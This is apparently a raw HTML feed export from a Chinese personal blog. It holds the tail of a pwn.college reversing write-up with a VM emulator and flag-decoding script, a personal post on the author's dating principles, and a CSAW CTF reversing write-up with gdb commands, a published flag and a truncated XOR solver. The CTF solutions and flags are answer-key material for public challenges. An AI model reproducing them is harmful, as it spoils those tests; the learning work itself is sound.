<span class="token operator">=</span> <span class="token operator">-</span>b <span class="token operator">&amp;</span> <span class="token number">0xff</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Read  </span><span class="token interpolation"><span class="token punctuation">&#123;</span>v5<span class="token punctuation">&#125;</span></span><span class="token string"> bytes from file </span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string"> to memory stack[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">]"</span></span><span class="token punctuation">)</span>        writer_register<span class="token punctuation">(</span>arg2<span class="token punctuation">,</span> v5<span class="token punctuation">)</span>        print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arg1 <span class="token operator">&amp;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        v7 <span class="token operator">=</span> c        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">256</span> <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">&lt;</span> c<span class="token punctuation">:</span>           v7 <span class="token operator">=</span> <span class="token operator">-</span>c        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Write </span><span class="token interpolation"><span class="token punctuation">&#123;</span>v7<span class="token punctuation">&#125;</span></span><span class="token string"> bytes from memory[ </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string"> to file </span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">]"</span></span><span class="token punctuation">)</span>        writer_register<span class="token punctuation">(</span>arg2<span class="token punctuation">,</span> v7<span class="token punctuation">)</span>         print_register<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arg1 <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Exit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># 示例用法</span>    file_path <span class="token operator">=</span> <span class="token string">r"F:\研二上\coding\ctf\pwncollege\command"</span>  <span class="token comment"># 替换为实际的文件路径</span>    a <span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> i<span class="token punctuation">,</span> f <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token comment"># 0x300</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        chunk <span class="token operator">=</span> read_binary_file_in_chunks<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Read chunk: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>chunk<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>        arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg2 <span class="token operator">=</span> chunk        <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            imm<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">&amp;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            add<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">&amp;</span> <span class="token number">0x02</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            stk<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            stm<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">&amp;</span> <span class="token number">0x01</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            ldm<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">&amp;</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token builtin">cmp</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">&amp;</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            jmp<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">&amp;</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            sys<span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逻辑还是比较简单的，是一个位移加密的操作.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">adder <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span>    <span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span>    <span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x8a</span><span class="token punctuation">,</span><span class="token number">0xdc</span><span class="token punctuation">,</span><span class="token number">0xaa</span><span class="token punctuation">,</span>    <span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span>    <span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x8d</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span>    <span class="token number">0xba</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">read_binary_file_in_chunks</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> start_position<span class="token operator">=</span><span class="token number">0x39a</span> <span class="token punctuation">,</span>chunk_size<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment"># 以二进制模式打开文件</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>start_position<span class="token punctuation">)</span>  <span class="token comment"># 定位到指定的开始位置</span>            chunk <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>chunk_size<span class="token punctuation">)</span>  <span class="token comment"># 每次读取三个字节</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> chunk<span class="token punctuation">:</span>                <span class="token keyword">break</span>  <span class="token comment"># 到达文件末尾，退出循环</span>            <span class="token keyword">return</span> chunk  <span class="token comment"># 使用生成器返回读取的字节块</span>filepath <span class="token operator">=</span> <span class="token string">r"F:\研二上\coding\ctf\pwncollege\command"</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">21</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        byte <span class="token operator">=</span> read_binary_file_in_chunks<span class="token punctuation">(</span>file_path<span class="token operator">=</span>filepath<span class="token punctuation">,</span> start_position<span class="token operator">=</span><span class="token number">0x386</span><span class="token operator">+</span>num<span class="token punctuation">,</span> chunk_size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">21</span> <span class="token punctuation">:</span>         <span class="token keyword">break</span>    res<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span> <span class="token operator">-</span> adder<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        <span class="token keyword">if</span> res<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">:</span>         res<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">0xff</span>        res<span class="token punctuation">[</span>num<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606171440.png" alt="20240606171440"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与女生的交往标准</title>
      <link href="/2024/01/26/yu-nu-sheng-de-jiao-wang-biao-zhun/"/>
      <url>/2024/01/26/yu-nu-sheng-de-jiao-wang-biao-zhun/</url>
      
        <content type="html"><![CDATA[<h1 id="与女生的交往标准"><a href="#与女生的交往标准" class="headerlink" title="与女生的交往标准"></a>与女生的交往标准</h1><blockquote><p>之所以要写这个，其实也非常感谢最近这段时间相互了解的女生。事情是昨天晚上发生的，但还是有些想记录下来的东西。我对她没有恶意，也不觉得是她人品有问题。互相选择，仅此而已，都过去了~</p></blockquote><h2 id="写给未来的女友"><a href="#写给未来的女友" class="headerlink" title="写给未来的女友"></a>写给未来的女友</h2><p>如果我选择把这个分享给你，请你一定要多看几遍。<strong>拜托了</strong>🙏！</p><ul><li><p><strong>任何时候，如果你的心中有了明确的选择，一定要告诉我。</strong> <strong>注意是任何时候，不要等。注意是明确的选择，也就是你心中大概率估计，我不适合你。</strong>也不要用些冷暴力，冷回复来敷衍我，如果我感觉到了，而你又没有明确告诉我，我会创造一个双方冲突的机会，让你把实话说出来。别怪我，我主动承担恶人的身份是因为我不想浪费我的时间和精力。</p></li><li><p>我是一个<strong>对待过程很认真的人</strong>，既然我选择了深入去了解你的性格和生活，那至少在这个过程中，我是非常认真地且在用心的，如果我觉得有敷衍的情况，我会选择告诉你，你是想离开还是继续由你来选择。同样，我希望你也如此，如果你感觉自己有些勉强，或者很反感我这样的话语，千万别压抑自己，你可以选择直接离开，甚至骂我两句扬长而去都可以。<strong>记住，我不勉强别人，求你也千万别勉强自己。</strong></p></li><li><p>我不喜欢在网上长时间的聊天，我比较喜欢现实生活中的交谈。千万别以为我另有所图，<strong>如果我和你有任何身体接触，你可以直接选择离开甚至报警都可以。</strong>我只是单纯地希望两个人能坐下来，或者散散步，在这个过程中，好好地交流。别无所图。<strong>还有就是，你要是不信，也千万别勉强自己，可以直接离开。</strong></p></li><li><p>我希望大家的交流<strong>不局限于兴趣爱好和吃喝玩乐</strong>，我承认这些很重要，但我不认为这些因素是决定幸福生活的关键。我希望交流的内容能<strong>包含你对待任何事情的态度、看法以及你的处理方式，负面也好，正面也好，都是我希望能了解到的。</strong>当然，信任的建立需要一些时间，我可以留给你足够的时间，但我不保证我能坚持到你愿意告诉我的时候。</p></li><li><p>我希望大家离开的时候可以体面一点，最起码能等到双方都发表完自己的意见之后。我不会伤害任何一个对我没有敌意的陌生人，更何况你与我已经有过很多交流。希望在你决定要离开的时候，能回想起这句话，这算是我给自己留的后路吧。</p></li><li><p>我希望你不要骗我，很大程度上，我都能猜到你的内心活动，可能不是那么准确，但大体方向是对的。千万别试图用语言欺骗我，很多时候我不揭穿你，是怕你难堪。你可以选择说一部分或者干脆不说。但有什么话，还请尽量表达，我自认为非常可以理解别人。<strong>千万别骗我</strong>~</p></li><li><p>最后，如果你有一点念头，觉得我这么做是不是大题小作，甚至无事生非的话，千万别勉强自己，你可以选择马上离开。<strong>如果你不反感，那我们可以继续。如果你赞同，我们也可以继续</strong>。<strong>但请记住，千万别勉强自己。</strong>一定要深刻地理解自己，可以<strong>多看几遍</strong>，问问自己的心，你所做的决定一定要是自己内心真正的决定。</p></li></ul><hr><p>如果有你想问我为什么这么做？</p><p>下面就是我的理由：</p><ul><li>我是一个很认真的人，我不希望我被伤害，也不希望别人受到伤害。<strong>千万别勉强自己，真的真的拜托🙏了</strong>，这不仅仅是对我负责，也是对你负责。</li><li>我受不了，一个人都已经占据了我心里一部分之后，再转身离开。真的受不了，我真的会很难受很难受，而且这种难受会极大地影响我，且无法产生任何积极有效的效果。只能让我变得更加麻木，更加冷酷，更加不相信人类最美好的情感。<strong>我讨厌变成这样，千万别再往前推我了</strong>🙏。</li><li>我想把最好的自己留给最想珍惜的人，我不希望因为以前的种种不愉快，让我降低了对这个人存在的期待。哪怕我找不到这样的人，我也不希望我的情感在这个过程中，一点点地流逝殆尽，最后变成一个失去爱别人能力的干尸。</li></ul><p>这是我的理念，我必须要告诉你。<strong>也千万别因为这个东西，就要批判我，或者给我戴上光环。</strong> <strong>我首先是自私的，也是自爱的，这么做完全是为了我自己，没有要为了其他人的意思。</strong> 我有<strong>缺点</strong>，也有优点，是一个非常正常的普通人，别带有任何主观想象在里面。<strong>我没有任何想要证明自己是个好人的想法，你也千万别这么认为，我只是为了我自己。</strong> <strong>这只是一个我与女生交往最基本的准则。</strong>你可以有自己想法，可以有自己的观点，但千万千万别勉强。真的拜托了🙏。</p><p>还有就是，<strong>如果我怀疑你违反了上面的理念，我会询问你，如果我确认你的确是有些勉强，那我就要选择离开了。希望你能理解。</strong></p><hr><p><strong>如果你读到这里了，拜托多读几遍，冷静一下，别冲动地下决定。过个24小时，再来做决定。如果你真的这么做了，我向你表示感谢，真的很感谢你认真地对待自己的感情，也认可我的想法。谢谢~</strong></p><hr><p>轩  2024.1.26日 早10：37</p>]]></content>
      
      
      <categories>
          
          <category> 感情 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 与女生的交往标准 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW-CTF--Write-Rev</title>
      <link href="/2023/09/19/csaw-2023-writeup/"/>
      <url>/2023/09/19/csaw-2023-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="CSAWCTF—FreeBSD-gdb常用调试命令"><a href="#CSAWCTF—FreeBSD-gdb常用调试命令" class="headerlink" title="CSAWCTF—FreeBSD  gdb常用调试命令"></a>CSAWCTF—FreeBSD  gdb常用调试命令</h1><p><strong>没想到，上次更新是一年前了。到底是好是坏呢？</strong></p><p>做下来最重要的感受，其实就是编程，很多时候你想的和程序体现出来的完全是两个东西。在程序细枝末节的地方浪费太多时间只能证明我的<strong>两个问题</strong>：</p><ol><li><strong>问题没想清，就开始编程，然后在做的过程中不断debug。</strong>这种方式吧，对于一些偏软件的程序可以。但是对于偏向于逻辑的，不行。</li><li><strong>懒于编程，只要有可能用手算，就不编程，哪怕它再麻烦。</strong>人都是懒于思考的，我知道这很正常！但从长远来看，必须得强迫自己习惯编程，这样虽然开始难，但后续会变得简单，总之继续努力吧。</li></ol><p>csawctf里面有个逆向题，food，是FreeBSD下面的一个二进制程序。为此安装了FreeBSD系统，但是呢，里面的gdb非常难用。包括但不限于：默认情况下不显示汇编、n\s好像没用必须要用ni。不知道是因为我长久不做了，很多指令忘了，还是FreeBSD里面的gdb就是傻逼。我把常用的总结起来，以后忘了也好找。</p><table><thead><tr><th>指令</th><th>作用</th></tr></thead><tbody><tr><td>display /16i $pc</td><td>在每次单步调试的时候，显示的都是$pc往下的指令</td></tr><tr><td>display /16i $pc-16</td><td>在每次单步调试的时候，显示一部分$pc上面的指令</td></tr><tr><td>x/16i $pc</td><td>显示的都是$pc往下的指令</td></tr><tr><td>x/16i $pc-16</td><td>显示一部分$pc上面的指令</td></tr><tr><td></td><td></td></tr><tr><td>x /54xw 0x12345678</td><td>显示内存地址0x12345678所存储的内容 。 <br /><code>x</code>: 这是GDB的<code>examine</code>命令，用于查看内存中的数据<br /> <code>54</code>: 这表示要显示的数据的数量，也就是显示54个数据。<br /> <code>x</code>: 这表示以十六进制格式显示数据。 <br /><code>w</code>: 这表示每个数据的大小为字（word），通常是4个字节。</td></tr><tr><td>info registers</td><td>查看寄存器</td></tr><tr><td>info proc mappings</td><td>查看进程信息，包括各种段地址，栈地址</td></tr><tr><td>nexti–ni</td><td>单步调试，对他是ni，难道不该是n？</td></tr><tr><td>set *((int*)) 0x12345678  = 0xdead</td><td>将特定地址的内容修改为0xdead</td></tr><tr><td>b *0x123456</td><td>在0x123456地址处加上断点</td></tr><tr><td>info break</td><td>查看断点信息</td></tr><tr><td></td><td></td></tr><tr><td>dump memory memory-dump.bin  0x123456789  0x223456789</td><td>将从起始地址0x123456789到终止地址0x223456789的内存空间中的数据转储为memory-dump.bin的二进制文件</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="警惕"><a href="#警惕" class="headerlink" title="警惕"></a>警惕</h2><h3 id="1-memcpy-dest-“-lt-”-13988uLL"><a href="#1-memcpy-dest-“-lt-”-13988uLL" class="headerlink" title="1. memcpy(dest, “&lt;”, 13988uLL);"></a>1. memcpy(dest, “&lt;”, 13988uLL);</h3><p>这种第二个参数实际上是一个字符串指针！<strong>千万不要以为是<code>&lt;</code>赋值了13988遍，这错误我犯了不知道多少遍了!</strong></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/image-20230918194524449.png" alt="image-20230918194524449"></p><h3 id="2-右键可以直接转化为python-list对象"><a href="#2-右键可以直接转化为python-list对象" class="headerlink" title="2. 右键可以直接转化为python list对象"></a>2. 右键可以直接转化为python list对象</h3><p><strong>别费劲dump下来然后再读文件了！</strong></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/image-20230918195112681.png" alt="image-20230918195112681"></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>其实是不难的一个异或题，但我做了2天半，是的，两天半。</strong></p><p><strong>csawctf{aN0ther_HeRRing_or_iS_tHis_iT}</strong></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/image-20230919151038753.png" alt="image-20230919151038753"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/image-20230919150946859.png" alt="image-20230919150946859"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">EXPECTED_FLAG <span class="token operator">=</span> <span class="token string">"flag&#123;ph3w...u finaLly g0t it! jump into cell wHen U g3t t0 the next cha11&#125;"</span>SEED <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x5F</span><span class="token punctuation">,</span><span class="token number">0x7A</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span>    <span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x3D</span><span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x1F</span><span class="token punctuation">,</span>    <span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x1A</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x5C</span><span class="token punctuation">,</span><span class="token number">0x2A</span><span class="token punctuation">,</span><span class="token number">0x3</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x1C</span><span class="token punctuation">,</span>    <span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>    <span class="token number">0x1d</span><span class="token punctuation">,</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span>    <span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x3</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x9</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x06b</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span>    <span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x6</span><span class="token punctuation">,</span><span class="token number">0x5b</span><span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x2e</span><span class="token punctuation">,</span>    <span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0x0b</span><span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span>    <span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x4</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span>    <span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">]</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">file</span> <span class="token operator">=</span>  <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'memory_dump.bin'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x36b5</span><span class="token operator">//</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    byte_data  <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>byte_data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>        integer_value <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>byte_data<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>integer_value<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Not enough bytes read"</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        SEED<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> SEED<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>SEED<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">]</span>        b <span class="token 